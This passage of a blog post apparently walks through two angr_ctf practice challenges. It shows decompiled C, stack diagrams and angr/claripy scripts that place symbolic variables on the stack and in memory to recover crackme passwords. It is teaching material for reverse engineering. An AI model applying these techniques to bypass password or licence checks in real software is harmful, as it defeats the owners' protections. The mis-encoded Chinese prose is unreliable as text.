class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502110615.png" alt="image-20210502110608909"></p><h2 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h2><p>è€è§„çŸ©ï¼Œæ‰”idaé‡Œçœ‹ä¸‹ä»£ç </p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">handle_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">handle_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u %u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">complex_function0</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">complex_function1</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1087905000</span> <span class="token operator">&amp;&amp;</span> v1 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">135078575</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">complex_function0</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a1 <span class="token operator">^</span> <span class="token number">0x256BEDF0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">complex_function1</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a1 <span class="token operator">^</span> <span class="token number">0x9D110FE4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>çœ‹èµ·æ¥ä¹Ÿæ²¡ä»€ä¹ˆå·®åˆ«ï¼Œç”¨å¸¸è§„æ–¹æ³•ç›´æ¥<code>handle</code>æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯å¯¹æ ˆçš„æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦ç›´æ¥å¯¹æ ˆåšå˜åŒ–ï¼Œç„¶åä»ä¸€ä¸ªæŒ‡å®šçš„åœ°æ–¹ç©ºé™åˆ°ç¨‹åºä¸­ç»§ç»­æ‰§è¡Œã€‚çœ‹ä¸€ä¸‹idaä¸­æ±‡ç¼–ä»£ç éƒ¨åˆ†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502123113.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åœ¨<code>0x08048697</code>å†™å…¥æ ˆä¸­çš„ï¼Œå› æ­¤ï¼Œè¿™ä¸ªä¹Ÿæ˜¯æˆ‘ä»¬éœ€è¦â€œç©ºé™â€çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç»˜åˆ¶æ­¤æ—¶çš„æ ˆï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#            /-------- The stack --------\</span><span class="token comment"># ebp ->     |          padding          |</span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x01 |       more padding        |</span><span class="token comment">#            |---------------------------|</span><span class="token comment">#                        . . .               </span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x09 |   S1, last byte           |</span><span class="token comment">#            |---------------------------|</span><span class="token comment">#                        . . .                    </span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x0c |   S1, first byte          |</span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x0d |   S2, last byte           |</span><span class="token comment">#            |---------------------------|</span><span class="token comment">#                        . . .</span><span class="token comment">#            |---------------------------|</span><span class="token comment"># ebp - 0x10 |   S2, first byte          |</span><span class="token comment">#            |---------------------------|</span><span class="token comment">#                        . . .</span><span class="token comment">#            |---------------------------|</span><span class="token comment"># esp ->     |                           |</span><span class="token comment">#            \---------------------------/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>å½“æˆ‘ä»¬è¦ä¿®æ”¹æ ˆä¸­å†…å®¹æ—¶ï¼Œéœ€è¦å°†ä¸¤ä¸ªå˜é‡(S2,S2)å†™å…¥åˆ°æ ˆä¸­ï¼Œä¸ºæ­¤ï¼Œéœ€è¦å…ˆå°†<code>esp</code>æŒ‡é’ˆæŠ¬é«˜ï¼Œå³ç»™è¦å‹å…¥çš„å‚æ•°ï¼ˆ2ä¸ªå‚æ•°æ¯ä¸ªå 4å­—èŠ‚ï¼Œä¸€å…±å ç”¨8å­—èŠ‚ï¼‰åˆ›å»ºç©ºé—´ï¼Œå¯¹åº”æ±‡ç¼–ä»£ç å°±æ˜¯<code>sub esp, 0x08</code></p><p>ä¸‹é¢æ˜¯å®Œæ•´çš„é¢˜è§£ï¼Œæˆ‘ä¼šåœ¨å¿…è¦çš„åœ°æ–¹æ·»åŠ æ³¨é‡Šï¼Œå¸®åŠ©ç†è§£ï¼š</p><blockquote><p>ä¸ºäº†ä¸æ™®é€šæ–¹æ³•å¯¹æ¯”ï¼Œæˆ‘å°†ç›´æ¥é€šè¿‡è¾“å‡ºæ±‚è§£çš„æ–¹æ³•<code>basic</code>ä¹ŸåŠ å…¥äº†å…¶ä¸­</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">basic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'04_angr_symbolic_stack'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token comment"># Tell Angr to explore the binary and find any state that is_successful identfies</span>    <span class="token comment"># as a successful state by returning True.</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'04_angr_symbolic_stack'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    <span class="token comment"># èµ·å§‹åœ°å€å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°è¢«å‹å…¥æ ˆä¸­çš„åœ°å€</span>    start_address <span class="token operator">=</span> <span class="token number">0x08048697</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    <span class="token comment">#ã€€ç”±äºè¦å¯¹æ ˆåšæ“ä½œï¼Œéœ€è¦å…ˆå°†espæŒ‡å‘ebp</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp    <span class="token comment"># æ„å»ºä¸¤ä¸ªä½å‘é‡ï¼Œå³ç¬¦å·å˜é‡ï¼ŒåŒæ ·æ˜¯ï¼“ï¼’ä½</span>    passwd_size_in_bits <span class="token operator">=</span> <span class="token number">32</span>    password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    <span class="token comment"># ä¸‹é¢éœ€è¦å°†ç¬¦å·å˜é‡æ³¨å…¥æ ˆä¸­ï¼Œä¸ºæ­¤éœ€è¦å…ˆè…¾å‡ºä¸¤ä¸ªå˜é‡çš„ç©ºé—´ï¼Œå³2*4=8å­—èŠ‚</span>    padding_length_in_bytes <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment"># :integer</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> padding_length_in_bytes    <span class="token comment"># å°†å˜é‡å‹å…¥æ ˆä¸­</span>    initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password0<span class="token punctuation">)</span>  <span class="token comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>    initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>password1<span class="token punctuation">)</span>  <span class="token comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span>    <span class="token comment"># ä¸‹é¢çš„æ­¥éª¤å°±å’Œå¯„å­˜å™¨çš„éƒ¨åˆ†ä¸€æ ·äº†</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">)</span>        solution1 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password1<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success, flag is: &#123;&#125; &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution0<span class="token punctuation">,</span> solution1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token comment">#</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># basic()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502132837.png" alt=""></p><h2 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h2><p>ç…§ä¾‹æŸ¥çœ‹ä¸€ä¸‹åç¼–è¯‘çš„æºç ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>user_input<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x21u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%8s %8s %8s %8s"</span><span class="token punctuation">,</span> user_input<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_9FD92A8<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_9FD92B0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_9FD92B8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">167613088</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">167613088</span><span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>user_input<span class="token punctuation">,</span> <span class="token string">"FINYOEXAGBOWGBBJRUCGWNQJZNFZTPPQ"</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">||</span> a1 <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">*</span> a2 <span class="token operator">+</span> a1 <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>ç¨‹åºå¯¹è¾“å…¥8å­—èŠ‚æ•°æ®ç»è¿‡32æ¬¡å¾ªç¯å˜æ¢ï¼Œæœ€åå–å‰20ä½ä¸æŒ‡å®šå­—ç¬¦ä¸²æ¯”è¾ƒï¼ŒåŒæ ·åœ°ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªâ€œç©ºé™â€ä½ç½®ï¼Œä¸ºäº†ä¸å½±å“ç»“æœï¼Œè¯¥ä½ç½®è¦åœ¨<code>scanf</code>ä¹‹åï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502145422.png" alt=""></p><p>æˆ‘ä»¬å°†åˆå§‹åŒ–çš„çŠ¶æ€å®šåœ¨<code>scanf</code>æ‰§è¡Œä¹‹åï¼Œ<code>080485FE</code>æ˜¯<code>esp</code>è…¾å‡ºç©ºé—´ç»™4ä¸ª8å­—èŠ‚å˜é‡ï¼Œå› æ­¤ï¼Œé€‰æ‹©<code>080485FE</code>æˆ–è€…<code>08048601</code>ä½œä¸ºèµ·å§‹åœ°å€éƒ½æ˜¯å¯ä»¥çš„ã€‚</p><p>æ¥ç€å› ä¸ºæˆ‘ä»¬éœ€è¦ä¿®æ”¹å†…å­˜ä¸­çš„æ•°æ®ï¼Œé€šè¿‡åŒå‡»<code>user_input</code>å˜é‡æŸ¥çœ‹è¾“å…¥çš„æ•°å€¼è¢«å­˜å‚¨åˆ°äº†å“ªé‡Œï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502143634.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°åœ¨<code>bss</code>æ®µä¸­ï¼Œå››ä¸ªå˜é‡é¡ºåºå­˜å‚¨ï¼ˆé—´éš”ä¸º8å­—èŠ‚ï¼‰ï¼Œ<code>user_input</code>èµ·å§‹åœ°å€<code>09FD92A0</code>å°±æ˜¯æˆ‘ä»¬è¦â€œç©ºé™â€çš„ä½ç½®ã€‚<code>angr</code>å…è®¸é€šè¿‡æ“ä½œå†…å­˜ï¼Œæ’å…¥ç¬¦å·å˜é‡ï¼Œä¸»è¦é€šè¿‡<code>memory</code>çš„ä¸¤ä¸ªæ¥å£ï¼ˆå•ä½ä¸º<code>bytes</code>ï¼‰ï¼š</p><ul><li><code>load(addr,...)</code>: è¯»å–æŒ‡å®šåœ°å€çš„å†…å­˜</li><li><code>store(addr, ...)</code>: å‘æŒ‡å®šå†…å­˜å†™å…¥æ•°æ®</li></ul><p>ä¸‹é¢æ˜¯å®Œæ•´çš„é¢˜è§£ï¼Œæˆ‘åœ¨å¿…è¦çš„åœ°æ–¹æ·»åŠ äº†æ³¨é‡Šï¼Œå¸®åŠ©ç†è§£</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'05_angr_symbolic_memory'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    <span class="token comment"># åˆå§‹åŒ–çŠ¶æ€ä½ç½®ï¼Œåœ¨scanfå‡½æ•°ä¹‹åçš„ä¸¤ä¸ªå‡å¯</span>    start_address <span class="token operator">=</span> <span class="token number">0x080485FE</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    <span class="token comment"># æ³¨æ„è¿™æ¬¡è¾“å…¥çš„æ•°æ®æ˜¯ï¼˜å­—èŠ‚çš„ï¼Œå› æ­¤ç¬¦å·å˜é‡çš„ä½æ•°æ˜¯8*8=64</span>    passwd_size_in_bits <span class="token operator">=</span> <span class="token number">8</span><span class="token operator">*</span><span class="token number">8</span>    password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password1'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password2'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    password3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password3'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    <span class="token comment"># è¦æ³¨å…¥ç¬¦å·å˜é‡çš„ä½ç½®ï¼Œå³è¾“å…¥å˜é‡åœ¨å†…å­˜ä¸­çš„åœ°å€</span>    password0_address <span class="token operator">=</span> <span class="token number">0x09FD92A0</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>    <span class="token comment">#ã€€ç”±äº4ä¸ªå˜é‡æ˜¯è¿ç»­å­˜å‚¨ï¼Œç›´æ¥æŒ‰8å­—èŠ‚å åŠ å³å¯</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>password0_address <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">,</span> password1<span class="token punctuation">)</span>    initial_state<span class="token punctuation">.</span>memory<span class="token 